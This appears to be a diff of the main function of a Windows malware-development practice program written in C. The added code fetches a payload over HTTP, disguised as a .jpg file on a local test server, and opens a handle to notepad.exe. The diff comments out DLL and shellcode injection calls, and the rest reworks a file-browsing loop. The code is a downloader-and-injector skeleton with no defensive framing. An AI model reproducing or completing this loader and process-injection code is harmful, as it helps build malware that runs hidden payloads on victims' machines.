@@ -2,18 +2,21 @@
 
 int main()
 {
-	
+	SIZE_T sPayload = 0;
+	PBYTE pPayload;
+	if (!FetchPayloadHttpDynamic(L"http://127.0.0.1:8000/Resources/Test1.jpg", &pPayload, &sPayload)) printf("[x] Failed :(\n");
+	else printf("[!] Success\n");
 	DWORD dwProcessId;
 	LPTEXT pText_t;
 	HANDLE hProcess;
-	if ((hProcess = FetchProcess(L"notepad.exe", &dwProcessId)) == INVALID_HANDLE_VALUE) { return -1; }
+	if ((hProcess = FetchProcess(L"notepad.exe", &dwProcessId)) == INVALID_HANDLE_VALUE) { printf("Couldn't Find it:(\n"); }
 	//if (!InjectDll(hProcess, L"C:\\Users\\mikmu\\Desktop\\DLL.dll")) return -2;
 	
 	call();
 	
-	if (!(pText_t = Test())) return -5;
+	//if (!(pText_t = Test())) return -5;
 	
-	if (!InjectShellcode(hProcess, (PBYTE)pText_t->pText, pText_t->sText)) return -6;
+	//if (!InjectShellcode(hProcess, (PBYTE)pText_t->pText, pText_t->sText)) return -6;
 
 	/*
 	unsigned char *pK[256] = {'\0'};
@@ -59,25 +62,28 @@ int main()
 	
 	PrintFilesArrayW(pFiles_arr_t);
 	
-	while (!UserInputFolders(pPath, pFiles_arr_t)) {
+	UserInputFolders(pPath, pFiles_arr_t);
+	
+	while (!UserInputContinueFolders()) {
 		
 		if (pFiles_arr_t == NULL) {
 			printf("[!] No Files Under Current Folder.\n");
 			break;
 		}
-
-		pFiles_arr_t = RefetchFilesArrayW(pPath, pFiles_arr_t);
+		FreeFileArray(pFiles_arr_t);
+		
+		pFiles_arr_t = FetchFileArrayW(pPath);
 
 		PrintCWD(pPath);
 
 		PrintFilesArrayW(pFiles_arr_t);
+		
+		UserInputFolders(pPath, pFiles_arr_t);
 	}
  	
 	PrintCWD(pPath);
-	wprintf(L"File Name: %s", pFiles_arr_t->pFiles_arr->file_data.cFileName);
+	wprintf(L"File Name: %s", pFiles_arr_t->pFilesNames_arr->pFileName);
 
-	if (pFiles_arr_t->pFiles_arr->file_data.dwFileAttributes & FILE_ATTRIBUTE_NORMAL)
-	{ printf("[X] Exiting With Error Code : % x\n", GetLastError()); return -3; }
 	
 	if(pFiles_arr_t != NULL)FreeFileArray(pFiles_arr_t);
 	HANDLE hFile = INVALID_HANDLE_VALUE;
